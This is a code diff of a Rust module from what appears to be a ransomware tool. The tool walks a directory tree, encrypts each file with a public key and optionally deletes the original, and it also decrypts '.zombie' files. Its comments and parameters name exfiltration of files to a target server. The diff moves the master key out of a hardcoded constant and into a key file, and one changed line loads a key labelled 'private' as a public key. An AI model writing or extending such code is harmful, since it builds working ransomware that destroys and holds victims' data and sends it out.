@@ -1,16 +1,18 @@
 //! A module for recursively walking a directory tree, processing
 //! files (encrypt, decrypt, exfiltrate), and deleting original files.
 
-use std::collections::HashSet;
-// use std::fs;  // for file deletion
-use std::io::{self, ErrorKind};
-use std::path::Path;
+use std::{
+    collections::HashSet,
+    // fs, // for file deletion
+    io::{self, ErrorKind},
+    path::Path,
+};
 
 use log::{debug, info};
 use walkdir::WalkDir;
 
 use crate::{
-    crypto::{EXTENSION, b64_decode, decrypt, encrypt},
+    crypto::{EXTENSION, decrypt, encrypt, load_private_key, load_public_key},
     error::AppError,
 };
 
@@ -46,14 +48,13 @@ const EXCLUDED_FILES: &'static [&'static str] = &[
     ".swo",
 ];
 
-const MASTER_PUBLIC_KEY_B64: &str = "ymUeDo3ToZmXII9lTA+Itgm/SWSKEiAHTvEtj25TKhY";
-
 /// Walks a directory tree starting from `path`, excluding directories
 /// and files based on predefined lists, and encrypts and exfiltrates
 /// files. It's like a spores burst--sporulate.
 ///
 /// # Arguments
 /// - `path`: Starting directory as a `PathBuf`
+/// - `key`: Pathbuf to the private key to decrypt files--see README
 /// - `no_delete`: Boolean flag: false means the original file is deleted
 /// - `server`: String representing the target server
 /// - `target_folder`: Option<String> for a specific folder on the server
@@ -66,6 +67,7 @@ const MASTER_PUBLIC_KEY_B64: &str = "ymUeDo3ToZmXII9lTA+Itgm/SWSKEiAHTvEtj25TKhY
 ///   - Optinally, deletes the original file locally
 pub fn sporulate(
     path: &Path,
+    key: &Path,
     no_delete: &bool,
     server: &String,
     target_folder: &Option<String>,
@@ -76,9 +78,19 @@ pub fn sporulate(
             format!("Path not found: {:?}", path),
         )));
     }
+
+    if !key.is_file() {
+        return Err(AppError::Io(io::Error::new(
+            ErrorKind::NotFound,
+            format!("Key not found: {:?}", key),
+        )));
+    }
+
+    let public_key = load_public_key(key)?;
+    debug!("Loaded private key from {:?}", key);
+
     let excluded_dirs_set: HashSet<&str> = EXCLUDED_DIRS.iter().cloned().collect();
     let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();
-    let master_public_key_bytes = b64_decode(MASTER_PUBLIC_KEY_B64)?;
 
     // Iterator creation and customization: Takes a path and creates a lazy
     // iterator that traverses the directory tree--only scans the file system
@@ -133,19 +145,8 @@ pub fn sporulate(
         if entry.file_type().is_file() {
             let file_path = entry.path();
 
-            // Encrypt enters here
             debug!("Encrypting file: {:?}", file_path);
-            encrypt(file_path, &master_public_key_bytes)?;
-            // TODO: Possibly, I'll have to handle errors at this
-            // level to prevent from breaking when encryption fails:
-            // match encrypt() {
-            //     Ok(encrypted_path) => {
-            //         debug!("File encrypted to: {:?}, size={} bytes", encrypted_path, file_size);
-            //     }
-            //     Err(err) => {
-            //         error!("Failed to encrypt file: {:?}, error={:?}", file_path, err);
-            //     }
-            // }
+            encrypt(file_path, &public_key)?;
 
             if !no_delete {
                 debug!("Deleting original file: {:?}", file_path);
@@ -197,6 +198,9 @@ pub fn disinfect(path: &Path, key: &Path) -> Result<(), AppError> {
         )));
     }
 
+    let private_key = load_private_key(&key)?;
+    debug!("Loaded master private key from {:?}", key);
+
     // Creates and sets the directory traversal lazy iterator.
     // Only valid files with the `.zombie` extension are processed.
     let walker = WalkDir::new(&path)
@@ -214,17 +218,9 @@ pub fn disinfect(path: &Path, key: &Path) -> Result<(), AppError> {
     for entry in walker {
         let file_path = entry.path();
         debug!("Decrypting file: {:?}", file_path);
-        decrypt(file_path, key)?;
-        // TODO: Just like the encryption--I'll have to handle errors
-        // to log and continue if a decryption fails.
-        // match decrypt() {
-        //     Ok(decrypted_path) => {
-        //         debug!("File decrypted to: {:?}, size={} bytes", decrypted_path, file_size);
-        //     }
-        //     Err(err) => {
-        //         error!("Failed to decrypt file: {:?}, error={:?}", file_path, err);
-        //     }
-        // }
+        decrypt(file_path, &private_key)?;
+
+        // TODO: Check if the .zombie file should be deleted (no-delete-like)
     }
 
     info!("Decryption process completed successfully: path={:?}", path);
